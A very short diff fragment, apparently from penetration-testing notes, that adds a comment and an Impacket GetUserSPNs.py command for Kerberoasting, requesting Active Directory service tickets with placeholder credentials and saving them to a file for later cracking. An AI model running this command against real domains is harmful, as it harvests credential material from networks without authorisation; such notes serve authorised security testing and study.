@@ -1,0 +1,3 @@
+# get user with SPN set and request tickets (kerberoast)
+python GetUserSPNs.py -request <domain>/<user>:<password> -outputfile <file>
+
